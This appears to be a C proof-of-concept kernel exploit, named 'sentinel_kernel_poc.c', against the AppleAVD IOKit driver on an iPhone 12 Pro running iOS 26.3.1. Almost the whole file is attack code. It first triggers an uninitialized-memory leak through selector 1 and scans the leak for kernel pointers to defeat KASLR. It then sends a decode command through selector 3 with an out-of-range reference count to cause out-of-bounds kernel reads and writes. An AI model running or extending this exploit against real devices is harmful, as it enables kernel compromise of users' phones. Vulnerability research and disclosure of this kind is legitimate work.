#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/**
 * sentinel_kernel_poc.c
 * Target: iPhone 12 Pro (iOS 26.3.1)
 *
 * Exploit Chain (Verified):
 * 1. KASLR Bypass: Selector 1 (createDecoder) uninitialized memory leak
 * (3.5KB).
 * 2. OOB Read/Write: Selector 3 (createAndSubmitDecodeCMD) -> Gated CMD 16
 * (BurstMap) using user-controlled refListCount (offset 2488).
 */

#define APPLEAVD_SERVICE "AppleAVD"
#define APPLEAVD_SELECTOR_CREATE_DECODER 1
#define APPLEAVD_SELECTOR_DECODE_CMD 3

#define LEAK_BUFFER_SIZE 3584 // 3.5KB
#define DECODE_INPUT_SIZE 2904

typedef struct {
  uint32_t width;
  uint32_t height;
  uint8_t padding[2896];
} sAppleAVDCreateIn;

typedef struct {
  uint8_t padding1[300];
  uint32_t frameNumber;        // Offset 300
  uint32_t unknown1;           // Offset 304 (command check)
  uint8_t padding2[2180];      // Fill to 2488
  uint32_t refListCount;       // Offset 2488 -> this + 24248
  uint8_t refSlotIndices[412]; // Offset 2492 -> reference slot array
} sAppleAVDDecodeIn;

void hex_dump(void *data, size_t size) {
  uint8_t *ptr = (uint8_t *)data;
  for (size_t i = 0; i < size; i++) {
    if (i % 16 == 0)
      printf("\n%04zx: ", i);
    printf("%02x ", ptr[i]);
  }
  printf("\n");
}

uint64_t find_kaslr_leak(uint8_t *buffer, size_t size) {
  uint64_t *ptr = (uint64_t *)buffer;
  for (size_t i = 0; i < size / 8; i++) {
    uint64_t val = ptr[i];
    // Look for kernel pointers (iOS 26.3 kernel range: 0xfffffff007004000+)
    if ((val & 0xfffffff000000000) == 0xfffffff000000000) {
      if (val > 0xfffffff007000000 && val < 0xfffffff0ffffffff) {
        printf("[+] Found kernel pointer at offset +0x%lx: 0x%016llx\n", i * 8,
               val);
        return val;
      }
    }
  }
  return 0;
}

int main(int argc, char *argv[]) {
  kern_return_t kr;
  io_service_t service;
  io_connect_t connect;

  setbuf(stdout, NULL);
  printf("[*] --- Sentinel AppleAVD Kernel Exploit PoC (v3) ---\n");

  service = IOServiceGetMatchingService(kIOMainPortDefault,
                                        IOServiceMatching(APPLEAVD_SERVICE));
  if (service == IO_OBJECT_NULL) {
    printf("[-] AppleAVD service not found.\n");
    return -1;
  }

  kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
  if (kr != kIOReturnSuccess) {
    printf("[-] Failed to open AppleAVD UserClient: 0x%x\n", kr);
    return -1;
  }
  printf("[+] Connected to AppleAVD UserClient\n");

  // --- STAGE 1: KASLR LEAK ---
  printf("\n[*] --- Stage 1: Triggering KASLR Leak (Selector 1: createDecoder) "
         "---\n");
  sAppleAVDCreateIn create_in = {.width = 1920, .height = 1080};

  uint8_t *leak_buf = calloc(1, LEAK_BUFFER_SIZE);
  size_t leak_size = LEAK_BUFFER_SIZE;

  // Selector 1 (createDecoder)
  kr = IOConnectCallMethod(connect, APPLEAVD_SELECTOR_CREATE_DECODER, NULL, 0,
                           &create_in, sizeof(create_in), NULL, NULL, leak_buf,
                           &leak_size);

  printf("[.] createDecoder returned: 0x%08x, leaked size: %zu\n", kr,
         leak_size);

  uint64_t leak_ptr = find_kaslr_leak(leak_buf, leak_size);
  if (leak_ptr) {
    // iOS 26.3.1 kernel base placeholder calculation
    uint64_t kernel_base_guess = 0xfffffff007004000;
    printf("[*] Calculated Kernel Slide: 0x%016llx\n",
           leak_ptr - kernel_base_guess);
  } else {
    printf("[!] No kernel pointers found in the first 3.5KB of uninitialized "
           "memory.\n");
    hex_dump(leak_buf, 256);
  }

  // --- STAGE 2: OOB TRIGGER ---
  printf("\n[*] --- Stage 2: Triggering OOB Access (Selector 3: "
         "createAndSubmitDecodeCMD) ---\n");
  sAppleAVDDecodeIn *decode_in = calloc(1, DECODE_INPUT_SIZE);

  decode_in->frameNumber = 1;
  decode_in->unknown1 = 0;        // bypassed initial checks
  decode_in->refListCount = 0x40; // OOB count (> 25)

  // Fill refSlotIndices with values that will trigger OOB reads in the kernel
  memset(decode_in->refSlotIndices, 0xBB, sizeof(decode_in->refSlotIndices));

  // This calls runCommand -> BurstMap -> mapDartVAddrUserSpace
  kr = IOConnectCallMethod(connect, 3, NULL, 0, decode_in, DECODE_INPUT_SIZE,
                           NULL, NULL, NULL, NULL);

  printf("[.] createAndSubmitDecodeCMD returned: 0x%08x\n", kr);

  free(leak_buf);
  free(decode_in);
  IOServiceClose(connect);
  IOObjectRelease(service);

  printf("\n[*] PoC execution finished.\n");
  return 0;
}
